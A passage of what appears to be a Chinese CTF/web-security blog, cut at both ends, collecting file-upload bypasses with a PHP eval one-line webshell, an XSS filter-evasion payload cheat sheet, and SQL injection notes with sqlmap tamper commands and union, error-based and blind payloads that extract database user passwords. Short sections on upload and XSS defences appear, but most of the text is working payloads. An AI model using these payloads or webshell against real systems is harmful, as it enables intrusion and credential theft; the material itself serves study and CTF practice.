class="code"><pre><span class="line">AddType application/x-httpd-php .abc</span><br></pre></td></tr></table></figure></p><p>之后，把 php 后门改成 xx.abc 上传上去就可以执行了。</p><p>7）、上传.user.ini</p><p>如果文件夹下有<br>Index.php  .user.ini  1.gif<br>我们在 .user.ini 里面写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif</span><br></pre></td></tr></table></figure></p><p>在 1.gif 写入 php 一句话  这样访问 php 文件即可  不需要重启 apache</p><p>修改 php.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif   不过需要重启apache服务器</span><br></pre></td></tr></table></figure></p><p>8）、配合文件包含漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">'x.jpg'</span>);?&gt;</span><br><span class="line">x.jpg写入一句话&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;  即可<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>9）、解析漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01、 IIS 6.0</span><br><span class="line">shell.asp;1.jpg</span><br><span class="line">shell.asp/1.jpg</span><br><span class="line">02、IIS 7 or Nginx</span><br><span class="line">shell.jpg/x.php</span><br><span class="line">shell.jpg%00.php</span><br><span class="line">03、Apache2</span><br><span class="line">shell.php.bak</span><br><span class="line">Shell.php.rar</span><br></pre></td></tr></table></figure></p><p>10）、其他绕过</p><p>01.上传 123.php:jpg，会生成 123.php 空文件，然后上传 123.&lt;&lt;&lt;，即可覆盖 123.php，把 Shell 内容写入 123.php 文件。</p><p>02.直接上传 Shell.php::$DATA</p><p>03.用 Burpsuite 拦截 将上传文件名改成 Shell.php%81 即可。</p><h2 id="上传漏洞防护"><a href="#上传漏洞防护" class="headerlink" title="上传漏洞防护"></a>上传漏洞防护</h2><p>1）、文件上传的目录设置为不可执行</p><p>只要 web 容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p><p>2）、判断文件类型</p><p>在判断文件类型时，可以结合使用 MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的 HTML 代码。</p><p>3）、使用随机数改写文件名和文件路径</p><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p><p>4）、单独设置文件服务器的域名</p><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS归纳</title>
      <link href="/2017/12/17/XSS%E5%BD%92%E7%BA%B3/"/>
      <url>/2017/12/17/XSS%E5%BD%92%E7%BA%B3/</url>
      
        <content type="html"><![CDATA[<p>常见的 xss 归纳</p><a id="more"></a><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p>1）、反射型<br>2）、存储型<br>3）、dom-xss</p><h1 id="突破xss的防御"><a href="#突破xss的防御" class="headerlink" title="突破xss的防御"></a>突破xss的防御</h1><p>关键字过滤 关键字不允许 关键字转义</p><h2 id="常规插入"><a href="#常规插入" class="headerlink" title="常规插入"></a>常规插入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(String.fromCharCode</span><br><span class="line">(97, 108, 101, 114, 116, 40, 47, 88, 83, 83, 47, 41))&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><h2 id="script-被过滤"><a href="#script-被过滤" class="headerlink" title="script 被过滤"></a>script 被过滤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/Script&gt;   </span><br><span class="line">&lt;scRiPt&gt;alert(/xss/);&lt;/scrIPt&gt;</span><br><span class="line">&lt;audio src=x onerror=prompt(1);&gt;  </span><br><span class="line">&lt;audio/src=x onerror=prompt(1);&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/XSS/)&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;  </span><br><span class="line">&lt;img/src=aaa.jpg onerror=prompt(1)&gt;</span><br><span class="line">&lt;video src=x onerror=prompt(1);&gt; </span><br><span class="line">&lt;video/src=x onerror=prompt(1);&gt;</span><br></pre></td></tr></table></figure><h2 id="on-标签"><a href="#on-标签" class="headerlink" title="on 标签"></a>on 标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onclick=<span class="string">"alert(/xss/)"</span>&gt;  </span><br><span class="line">&lt;div onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;div onclick =<span class="string">"alert(/xss/)"</span>&gt;  多一个空格  </span><br><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;textarea autofocus onfocus=alert(1)&gt;</span><br><span class="line">onload   onmouseenter  onmouseup  onmousedown  onmousemove</span><br><span class="line">onmouseout  onmouseover  onmouseleave  onkeydown  onkeypress  onkeyup</span><br></pre></td></tr></table></figure><h2 id="常见的绕过"><a href="#常见的绕过" class="headerlink" title="常见的绕过"></a>常见的绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=alert(1)&gt; //    </span><br><span class="line">&lt;a href=<span class="string">"javascript:alert(1)"</span>&gt;Clickme&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;   </span><br><span class="line">&lt;body/onpageshow=alert(1);&gt;</span><br><span class="line">&lt;q/oncut=\u0061lert(1)&gt; //  </span><br><span class="line">&lt;%0ascript&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;  </span><br><span class="line">&lt;iframe src=<span class="string">"javascript:alert(2)"</span>&gt;  </span><br><span class="line">&lt;a href=<span class="string">"javascr ipt:alert(1);"</span>&gt;click&lt;/a&gt;   </span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;  </span><br><span class="line">&lt;a href=<span class="string">"javasc ript:alert(1);"</span>&gt;click&lt;/a&gt;</span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="base64-编码绕过"><a href="#base64-编码绕过" class="headerlink" title="base64 编码绕过"></a>base64 编码绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe/src=<span class="string">"data:text/html; base64 ,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== "</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="隐藏标签绕过"><a href="#隐藏标签绕过" class="headerlink" title="隐藏标签绕过"></a>隐藏标签绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uid=1 accesskey=x onclick=<span class="string">"alert(1)"</span> //  火狐浏览器 alt <span class="built_in">shift</span> + x 同时按可以触发</span><br><span class="line">uid=<span class="string">"test"</span> <span class="built_in">type</span>=<span class="string">"text"</span> onfocus=<span class="string">"alert(1)"</span> autofocus a=<span class="string">""</span>//  <span class="built_in">type</span> 在 value 后面才行</span><br><span class="line">example：</span><br><span class="line">&lt;form&gt;</span><br><span class="line"> First name:&lt;br&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"firstname"</span> value=<span class="string">""</span>accesskey=x onclick=<span class="string">"alert(1)"</span> //<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> Last name:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input name="</span>lastname<span class="string">" value="</span><span class="built_in">test</span><span class="string">" type="</span>text<span class="string">" onfocus="</span>alert(1)<span class="string">" autofocus a="</span><span class="string">" type="</span>hidden<span class="string">"// </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure><h1 id="xss-防护"><a href="#xss-防护" class="headerlink" title="xss 防护"></a>xss 防护</h1><p>1）、控制输入输出 过滤一些关键字</p><p>诸如 alert script prompt img src on 等。</p><p>2）、对一些特殊字符进行转义<br>诸如将 “ , ‘ , &amp; ,&lt; ,&gt; 等转化为 HTML 实体。</p><p>预定义字符如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; 转义为 &amp;amp</span><br><span class="line"><span class="string">" 转义为 &amp;quot</span></span><br><span class="line"><span class="string">' 转义为 &amp;#039</span></span><br><span class="line"><span class="string">&lt; 转义为 &amp;lt</span></span><br><span class="line"><span class="string">&gt; 转义为 &amp;gt</span></span><br></pre></td></tr></table></figure></p><p>3）、最好是设置白名单</p><p>规定哪些标签、哪些字符可以输出。</p><p>4）、设置 HttpOnly</p><p>虽然它对 xss 漏洞不起作用，但是能够防止后期的 cookie 劫持攻击。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习</title>
      <link href="/2017/12/16/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/12/16/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>SQL注入一些归纳</p><a id="more"></a><h1 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h1><h2 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from sysobjects)&gt;0 返回异常</span><br><span class="line">and (select count (*) from msysobjects)&gt;0 返回异常</span><br><span class="line">and  asc(chr(97))=97   是否access数据库</span><br></pre></td></tr></table></figure><p>判断方法：在网址最后输入（’；），返回不正常的时候，说明是 access 类型的。反之，则是 mssql 类型的。</p><h2 id="SQLSERVER"><a href="#SQLSERVER" class="headerlink" title="SQLSERVER"></a>SQLSERVER</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from sysobjects)&gt;0  返回正常</span><br><span class="line">and (select count (*) from msysobjects)&gt;0 返回异常</span><br><span class="line">and left(version(),1)=5%23 //红色字体也可能是4</span><br><span class="line">and exists(select id from sysobjects)</span><br></pre></td></tr></table></figure><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=2 and version()&gt;0 返回正常</span><br><span class="line">id=2 and length(user())&gt;0 返回正常</span><br><span class="line">id=2 and char(49) 返回正常</span><br></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length (select user from dual)&gt;0 返回正常</span><br></pre></td></tr></table></figure><h1 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h1><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id=1'</span> LIMIT 0,1</span><br><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure><h2 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id='</span>1<span class="string">''</span> LIMIT 0,1  </span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>1   </span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>2</span><br></pre></td></tr></table></figure><h2 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id='</span>%1<span class="string">'%'</span> LIMIT 0,1</span><br><span class="line">1%<span class="string">' and '</span>%<span class="string">'='</span></span><br><span class="line">1%<span class="string">' and '</span>%<span class="string">'='</span>123</span><br></pre></td></tr></table></figure><h1 id="数据库类型及其注释符"><a href="#数据库类型及其注释符" class="headerlink" title="数据库类型及其注释符"></a>数据库类型及其注释符</h1><p><img src="1.jpeg" alt></p><h1 id="Sql注入常用的工具"><a href="#Sql注入常用的工具" class="headerlink" title="Sql注入常用的工具"></a>Sql注入常用的工具</h1><p>1）啊D ，适用 Access/Mssql<br>2）Pangolin<br>3）Sqlmap<br>4）AWVS<br>5）AppScan</p><p>一般较为常用的是1）2）3）</p><h1 id="sqlmap的使用方法"><a href="#sqlmap的使用方法" class="headerlink" title="sqlmap的使用方法"></a>sqlmap的使用方法</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap –u <span class="string">"url"</span> --dbs        查询所有数据库</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --current-db  查看当前数据库</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --users       查看所有用户</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --current-user  查看当前用户</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库  --tables 查看数据库里面的所有表</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库 –T  表 --columns 查看表里面所有的列</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库 –T  表 –C 列1,列2  --dump  查看所有数据</span><br><span class="line">Sqlmap –r post.txt  --dbs  post型注入</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --data=<span class="string">"id=1"</span> -f --banner --dbs --users  post 转化成 get</span><br><span class="line">--flush-session 把之前的结果清空，否则会影响判断得结果</span><br><span class="line">--is-dba  查看是否有数据库管理员权限</span><br><span class="line">--tamper  <span class="string">"space2randomblank.py"</span> 绕过脚本</span><br><span class="line">-p 关键字 或者在关键字加*  表示要检测的注入点</span><br><span class="line">space2randomblank.py 空格替换成%09</span><br><span class="line">randomcase.py   大小写</span><br><span class="line">unmagicquotes.py  宽字节 %bf</span><br><span class="line">randomcomments.py 随机分割关键词</span><br><span class="line">versionedmorekeywords.py 注释绕过</span><br><span class="line">space2comment.py   空格替换为/**/</span><br><span class="line">sqlmap –u <span class="string">"xx"</span>  --tamper <span class="string">"space2comment.py"</span>  --level 3 --risk 3</span><br></pre></td></tr></table></figure><h1 id="mysql-手工注入"><a href="#mysql-手工注入" class="headerlink" title="mysql 手工注入"></a>mysql 手工注入</h1><h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">判断类型</span><br><span class="line">And+1=1%23 或者 or+1=1%23</span><br><span class="line">判断列数</span><br><span class="line">?id=1<span class="string">'+order+by+2%23</span></span><br><span class="line"><span class="string">判断数据回显的位置</span></span><br><span class="line"><span class="string">?id=1'</span>+union+select+1,2%20%23</span><br><span class="line">获取数据库名</span><br><span class="line">?id=1<span class="string">'+union+select+1,database()%23</span></span><br><span class="line"><span class="string">获取数据库中的表名</span></span><br><span class="line"><span class="string">?id=1'</span>+union+select+1,table_name+from+information_schema.tables+<span class="built_in">where</span>+table_schema=0x64767761%23</span><br><span class="line">获取数据库中表的列名</span><br><span class="line">?id=1<span class="string">'+union+select+1,column_name+from+information_schema.columns+where+ table_name=0x7573657273%23</span></span><br><span class="line"><span class="string">获取数据库表中列字段的值</span></span><br><span class="line"><span class="string">?id=1'</span>union+select+1,group_concat(user,0x7E237E,password)+from+users%23</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>常见的拼接方式： and、or、&amp;&amp;、||</p><h4 id="利用-exp-函数报错注入"><a href="#利用-exp-函数报错注入" class="headerlink" title="利用 exp() 函数报错注入"></a>利用 exp() 函数报错注入</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * FROM(SELECT USER())a));</span><br></pre></td></tr></table></figure><p>报错查询语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and exp(~(select * FROM(SELECT USER())a))--+</span></span><br></pre></td></tr></table></figure><h3 id="利用-extractvalue-函数报错注入"><a href="#利用-extractvalue-函数报错注入" class="headerlink" title="利用 extractvalue() 函数报错注入"></a>利用 extractvalue() 函数报错注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security<span class="string">'),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名"><a href="#获取数据库中表的列名" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' ),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库表中列字段的值"><a href="#获取数据库表中列字段的值" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select concat(id,'</span>~<span class="string">',username,'</span>~<span class="string">',password) from security.users limit 2,1 ),0x7e))--+</span></span><br></pre></td></tr></table></figure><h3 id="利用-updatexml-函数报错注入-报错查询语句："><a href="#利用-updatexml-函数报错注入-报错查询语句：" class="headerlink" title="利用 updatexml 函数报错注入 报错查询语句："></a>利用 updatexml 函数报错注入 报错查询语句：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure><h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名-1"><a href="#获取数据库中的表名-1" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security<span class="string">'),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名-1"><a href="#获取数据库中表的列名-1" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">' ),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库表中列字段的值-1"><a href="#获取数据库表中列字段的值-1" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and updatexml(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 2,1 ),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h3 id="利用-floor-函数报错注入-报错查询语句："><a href="#利用-floor-函数报错注入-报错查询语句：" class="headerlink" title="利用 floor 函数报错注入 报错查询语句："></a>利用 floor 函数报错注入 报错查询语句：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select database()),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名-2"><a href="#获取数据库中的表名-2" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select table_name from information_schema.tables where table_schema='</span>security<span class="string">' limit 0,1),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名-2"><a href="#获取数据库中表的列名-2" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 0,1),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br><span class="line"><span class="string">获取数据库表中列字段的值</span></span><br><span class="line"><span class="string">?id=1'</span> union select count(*),1, concat(<span class="string">'~'</span>,(select concat(id,<span class="string">'~'</span>,username,<span class="string">'~'</span>,password) from security.users <span class="built_in">limit</span> 0,1),<span class="string">'~'</span>, floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>应用程序仅仅返回 True（页面）和 False（页面）。<br>先判断数据库长度试试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and length(database())=8%23</span></span><br></pre></td></tr></table></figure></p><p>left() 函数：得到字符串左部指定个数的字符  语法：left (string,n)  string 为要截取的字符串，n 为长度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and left(database(),1)='</span>d<span class="string">'--+</span></span><br><span class="line"><span class="string">?id=1'</span> and left(database(),2)=<span class="string">'dv'</span>--+</span><br></pre></td></tr></table></figure></p><p>substr() 函数：截取指定长度的字符串。 语法： string substr(string, start, length) 第一个参数为要处理的字符串，start 为开始位置，length 为截取的长度</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and substr(database(),1,1)='</span>d<span class="string">'--+ '</span></span><br><span class="line">?id=1<span class="string">' and substr(database(),2,1)='</span>v’--+</span><br></pre></td></tr></table></figure></p><p>ASCII() 函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and ascii(substr(database(),1,1))=100--+</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(substr(database(),2,1))=118--+</span><br></pre></td></tr></table></figure></p><p>ord() 函数：返回字符串第一个字符的 ASCII 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1‘ and ord(substr(database(),1,1))=100--+</span><br><span class="line">?id=1‘ and ord(substr(database(),1,1))=100--+</span><br></pre></td></tr></table></figure></p><p>mid() 函数：截取字符串指定长度的字符串<br>语法： MID(column_name,start[,length]) column_name 为要提取字符的字段，start 为开始截取位置(起始值是1)，length 为截取的长度(可选，默认余下所有字符)</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and MID(DATABASE(),1,1)='</span>d<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and MID(DATABASE(),2,1)=<span class="string">'v'</span> --+</span><br><span class="line">?id=1<span class="string">' and 